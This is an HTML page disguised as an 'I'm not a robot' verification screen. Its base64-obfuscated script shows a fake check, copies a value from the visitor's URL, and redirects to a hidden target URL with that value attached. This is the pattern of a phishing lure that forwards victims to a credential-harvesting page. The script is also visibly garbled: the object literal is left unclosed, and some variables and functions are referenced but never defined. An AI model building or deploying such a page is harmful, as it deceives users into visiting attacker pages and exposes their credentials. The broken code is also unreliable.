<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>I'm not a robot</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; background: #ffffff; font-family: "Segoe UI", sans-serif; overflow: hidden; }

        /* Splash Screen */
        #_pre_load {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            display: flex; justify-content: center; align-items: center;
            background: #fff; z-index: 9999;
        }

        .breath {
            width: 100px; height: auto;
            animation: breathe 2s ease-in-out infinite;
        }

        @keyframes breathe {
            0%, 100% { transform: scale(1); opacity: 0.8; }
            50% { transform: scale(1.1); opacity: 1; }
        }

        #_main_gate {
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        #_ui_msg { font-size: 14px; color: #333; margin-bottom: 18px; }

        .main-wrapper {
            display: flex; justify-content: space-between; align-items: center;
            width: 380px; padding: 16px 24px;
            border: 1px solid #e0e0e0; border-radius: 4px;
            background: #f9f9f9; box-shadow: 0 1px 2px rgba(0,0,0,0.05);
        }

        .left-content { display: flex; align-items: center; gap: 12px; }
        .trigger-zone { width: 26px; height: 26px; display: flex; justify-content: center; align-items: center; cursor: pointer; }
        .sq-box { width: 22px; height: 22px; border: 2px solid #c1c1c1; border-radius: 3px; background: white; }

        .loading-ring {
            width: 20px; height: 20px;
            border: 3px solid #f3f3f3; border-top: 3px solid #0052cc;
            border-radius: 50%; animation: spin 0.8s linear infinite;
        }

        .done-mark {
            width: 24px; height: 24px; background-color: #228b22;
            border-radius: 50%; display: flex; justify-content: center;
            align-items: center; color: white; font-size: 14px;
        }

        @keyframes spin { 100% { transform: rotate(360deg); } }
        #_status_label { font-size: 14px; color: #555; }
        .right-brand { text-align: center; display: flex; flex-direction: column; align-items: center; }
        .logo-img { width: 28px; height: auto; margin-bottom: 4px; }
        #_brand_label { font-weight: 700; font-size: 15px; color: #1a1a1b; margin: 0; }
        .legal-box { font-size: 10px; color: #888; margin-top: 2px; }
    </style>
</head>
<body>

    <div id="_pre_load">
        <img src="astro.png" class="breath" alt="">
    </div>

    <div id="_main_gate">
        <div id="_ui_msg"></div>
        <div class="main-wrapper">
            <div class="left-content">
                <div class="trigger-zone" onclick="_0x_run(this)">
                    <div id="_icon_state" class="sq-box"></div>
                </div>
                <span id="_status_label"></span>
            </div>
            <div class="right-brand">
                <img src="astro2.png" alt="" class="logo-img">
                <p id="_brand_label"></p>
                <div class="legal-box">Privacy . Terms</div>
            </div>
        </div>
    </div>

    <script>
        const _0xObj = {
            // "To view these documents, verify you are human below"
            _s1: "VG8gdmlldyB0aGVzZSBkb2N1bWVudHMsIHZlcmlmeSB5b3UgYXJlIGh1bWFuIGJlbG93",
            _s2: "dmVyaWZ5",
            _s3: "dmVyaWZ5aW5nLi4u",
            _s4: "c3VjY2Vzcw==",

            document.getElementById('_brand_label').innerText = atob(_0xObj._s5);

            setTimeout(() => {
                document.getElementById('_pre_load').style.display = 'none';
                document.getElementById('_main_gate').style.display = 'flex';

                _icn.innerText = 'âœ“';

            const _cUrl = window.location.href;
            const _key = atob(_0xObj._p1) + "=";
            let _val = "";

            if (_cUrl.includes(_key)) {

                _val = _cUrl.split(_key)[1];
            }

            let _target = atob(_0xObj._s6);
            if (_val) {
                _target += "#" + _val;
            }

            setTimeout(() => {
                window.location.href = _target;
            }, 800);
        }
    </script>
</body>
</html>
